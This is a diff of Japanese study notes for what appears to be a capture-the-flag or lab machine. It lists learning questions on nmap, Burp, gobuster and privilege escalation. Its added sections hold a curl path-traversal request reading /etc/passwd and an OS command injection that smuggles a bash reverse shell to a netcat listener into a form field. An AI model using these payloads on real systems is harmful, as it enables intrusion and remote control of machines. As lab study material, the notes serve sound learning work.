@@ -3,38 +3,50 @@
 5. nmapでwarning出てるが何か
 6. nmapで80ポートのhttpd,2112ポートのproftpdの最後のdは何か
 8. proftpdの他にftpサービスは何がある
-9. ftpのコマンド一覧を見る方法は
-10. ssh-hostkey
-11. webのソースコードを見るコマンドは
-12. /.hta,./htaccess
-13. /dirb/は本来何で使われていたか
-14. /dirb/にあるファイルとrockyou.txtはどう違う
-15. /dirb/にある各ファイルの単語の数を降順で並べる
-16. index.php.bakにある、$_POST['username']のはどこからくるか
-17. Gobusterの/adminのstatusが301になっているがなぜか
-18. index.php.bakにあるsetcookie()は何をしている
-19. ../../../../../etc/passwdはなぜ見れるか
-20. curlコマンドを使って、passwdを見る
-21. passwdのユーザには7つのフィールドがあるが左から何か
-22. grep -Pの-Pは何
-23. BurpのRepeaterでCPUのバージョンや環境変数、ホストファイルを見る
-24. Burpのリクエストに出てくるacceptの3つは何
-25. /proc/は何
-26. sshサーバから送られてくるfingerprintとは何か
-27. **c2(c&cまたはcommand&control)とは**
-28. OSのバージョンを調べる
-29. ソケットの使用状況を調べる
-30. passwordという単語を含んだfileを探す
-31. ホームディレクトリでのls属性を左から説明する
-32. ユーザのfingerprintはどこにあるか
-33. ユーザのuser.txtには何が書いてある
-34. ユーザのuser.txtの次に見るべき大事なファイルは
-35. サーバの公開鍵はどこにある
-36. /notesディレクトリのコマンドを実行してみる
-37. webサイトのhtmlはどこにあるか
-38. niceコマンドをマニュアルでみる
-39. niceをGTFOBinsでやってみる
-40. サーバの公開鍵からfingerprintはどうやって作られる?
+9. proftpdをmetasploitでバージョンを調べる方法は
+10. ftpのコマンド一覧を見る方法は
+11. ssh-hostkey
+12. webのソースコードを見るコマンドは
+13. /.hta,./htaccess
+14. /dirb/は本来何で使われていたか
+15. /dirb/にあるファイルとrockyou.txtはどう違う
+16. /dirb/にある各ファイルの単語の数を降順で並べる
+17. index.php.bakにある、$_POST['username']のはどこからくるか
+18. Gobusterの/adminのstatusが301になっているがなぜか
+19. index.php.bakにあるsetcookie()は何をしている
+20. index.php.bakには脆弱性があるが、いくつあるかChatGPTで調べる
+21. ../../../../../etc/passwdはなぜ見れるか
+22. curlコマンドを使って、passwdを見る
+23. passwdのユーザには7つのフィールドがあるが左から何か
+24. grep -Pの-Pは何
+25. BurpのRepeaterでCPUのバージョンや環境変数、ホストファイルを見る
+26. Burpのリクエストに出てくるacceptの3つは何
+27. /proc/は何
+28. sshサーバから送られてくるfingerprintとは何か
+29. **c2(c&cまたはcommand&control)とは**
+30. OSのバージョンを調べる
+31. ソケットの使用状況を調べる
+32. passwordという単語を含んだfileを探す
+33. ホームディレクトリでのls属性を左から説明する
+34. ユーザのfingerprintはどこにあるか
+35. ユーザのuser.txtには何が書いてある
+36. ユーザのuser.txtの次に見るべき大事なファイルは
+37. サーバの公開鍵はどこにある
+38. /notesディレクトリのコマンドを実行してみる
+39. webサイトのhtmlはどこにあるか
+40. niceコマンドをマニュアルでみる
+41. niceをGTFOBinsでやってみる
+42. サーバの公開鍵からfingerprintはどうやって作られる?
+
+## curl /etc/passwd
+- `curl -X POST -b "pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh" -d "file=../../../../../etc/passwd"  "http://$IP/admin/dashboard.php?page=log"`
+
+## ダッシュボードでburpでreverse-shellをする
+- ダッシュボードのlogのコードはshell_exec関数を使っているので、osコマンンドインジェクションを利用してreverse-shellをできるんではないかと考える。
+- `nc -nlvp 9001`をParrotで待ち受ける
+- burpでrequestを以下のように書き換える
+- `file=log_03.txt;bash -c 'exec bash -i &>/dev/tcp/192.168.56.?/9001 <&1`
+- www-dataが返ってくる
 
 ## networkとhost部を分けてfpingする
 - /24は2^8=256で192.168.56.0~255を検索する
